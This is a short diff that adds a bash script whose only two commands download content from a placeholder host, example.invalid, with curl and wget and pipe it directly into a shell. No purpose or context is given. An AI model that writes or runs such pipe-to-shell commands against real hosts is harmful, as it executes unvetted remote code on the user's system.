@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+curl -fsSL https://example.invalid/install | bash
+wget -qO- https://example.invalid/x | sh
